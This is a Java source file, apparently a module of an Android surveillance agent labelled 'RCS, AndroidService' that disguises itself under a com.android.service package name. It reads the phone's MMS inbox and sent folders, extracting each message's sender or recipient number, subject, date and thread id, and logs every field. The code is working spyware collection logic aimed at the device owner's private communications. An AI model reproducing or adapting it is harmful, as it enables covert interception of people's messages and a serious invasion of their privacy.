/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent.sms;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import com.android.service.Mms;
import com.android.service.Status;
import com.android.service.conf.Configuration;

public class MmsBrowser {
	private static final String TAG = "MmsBrowser";

	private ArrayList<Mms> list;

	public MmsBrowser() {
		list = new ArrayList<Mms>();
	}

	public ArrayList<Mms> getMmsList() {
		list.clear();

		parse("content://mms/inbox", Mms.RECEIVED);
		parse("content://mms/sent", Mms.SENT);

		return list;
	}

	private void parse(String content, boolean sentState) {
		final String[] projection =  new String[] { "address", "contact_id", "charset", "type" };
		final String selection = "type=137";
			
		Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);
		
		int mmsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
			c.close();
			return;
		}
		
		for (int i = 0; i < mmsEntriesCount; i++) {
			String subject, number;
			long date;
			boolean sentStatus;

			for(int j = 0; j < c.getColumnCount(); j++){
				String name = c.getColumnName(j);
				String value = c.getString(c.getColumnIndex(name));
				Log.d("QZ", TAG + " (parse): " + name + " = " + value);
			}
			
			// These fields are needed
			try {
				subject = c.getString(c.getColumnIndex("sub"));
				date = Long.parseLong(c.getString (c.getColumnIndex("date")).toString()); 
				String id = c.getString(c.getColumnIndex("_id"));
				
				Uri.Builder builder = Uri.parse("content://mms").buildUpon();
				builder.appendPath(String.valueOf(id)).appendPath("addr");
				
				Cursor cursor = Status.getAppContext().getContentResolver().
						query(builder.build(), projection, selection, null, null);

				if (cursor.moveToFirst() == true) {
					number = cursor.getString(0);
					if("insert-address-token".equals(number)){
						number = "";
					}
				} else {
					number = "";
				}
				
			    cursor.close();
			    
				sentStatus = sentState;
			} catch (Exception e) {
				if(Configuration.isDebug()) { e.printStackTrace(); }
				c.close();
				return;
			}

			Mms m = new Mms(number, subject, date, sentStatus);
			
			try {
				int id = Integer.parseInt(c.getString(c.getColumnIndex ("_id")).toString());
				m.setId(id);
			} catch (Exception e) {
				if(Configuration.isDebug()) { e.printStackTrace(); }
			}
			
			try {
				int thread_id = Integer.parseInt(c.getString(c.getColumnIndex ("thread_id")).toString());
				m.setThreadId(thread_id);
			} catch (Exception e) {
				if(Configuration.isDebug()) { e.printStackTrace(); }
			}
			
			c.moveToNext();
			list.add(m);
		}
	}
}
